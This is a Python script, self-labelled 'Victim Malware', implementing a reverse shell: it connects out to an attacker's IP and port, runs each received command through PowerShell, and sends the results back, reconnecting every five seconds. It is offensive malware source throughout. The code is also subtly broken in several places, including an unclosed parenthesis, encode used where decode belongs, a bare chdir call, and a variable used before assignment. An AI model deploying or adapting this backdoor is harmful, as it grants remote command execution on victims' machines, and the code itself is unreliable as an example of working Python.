#! /usr/bin/python3

import socket, time
import os, subprocess
import pyfiglet, termcolor

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

banner = "Victim Malware"
print(termcolor.colored(pyfiglet.figlet_format(banner), color="red", attrs=["bold"]))

if __name__ == "__main__":

    hacker_IP = input(termcolor.colored("[+] Enter the target IP address: ", color="green", attrs=["bold"]))
    hacker_port = input(termcolor.colored("[+] Select port to connect to: ", color="green", attrs=["bold"])
    hacker_address = (str(hacker_IP), int(hacker_port))

    while True:
        try:
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(termcolor.colored("[+] Trying to connect with : ", color="green", attrs=["bold"]), end="")
            print(termcolor.colored(hacker_address, color="white", attrs=["bold"]))
            victim_socket.connect((hacker_address))

            while True:
                data = victim_socket.recv(1024)
                hacker_command = data.encode()
                print(termcolor.colored("[$] Hacker command = ", color="blue", attrs=["bold"]), end="")
                print(termcolor.colored(hacker_command, color="white", attrs=["bold"]))

                # This part is to exit the program safely
                if hacker_command == "quit" or hacker_command == "exit":
                    break
                # if the hacker presses enter unexpectedly
                elif hacker_command == "":
                    continue
                # to move directories
                elif hacker_command.startswith("cd"):
                    path2move = hacker_command.strip("cd ")

                    # command to move to the required path if it exists
                    if os.path.exists(path2move):
                        chdir(path2move)
                    else:
                        print(termcolor.colored("[!] Connot change dir to ", color="yellow", attrs=["bold"]), end="")
                        print(termcolor.colored(path2move, color="white", attrs=["bold"]))
                    continue

                else:
                    # run powershell command from the hacker
                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)

                    if output.stderr.decode("utf-8") == "":
                        command_result = command_result.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = command_result.stderr
                    victim_socket.sendall(command_result)

        except KeyboardInterrupt:
            print(termcolor.colored("[!] Exiting...", color="red", attrs=["bold"]))

        except Exception as err:
            print(termcolor.colored("[!] Unable to connect ", color="red", attrs=["bold"]), end="")
            print(termcolor.colored(err, color="white", attrs=["bold"]))
            time.sleep(5)


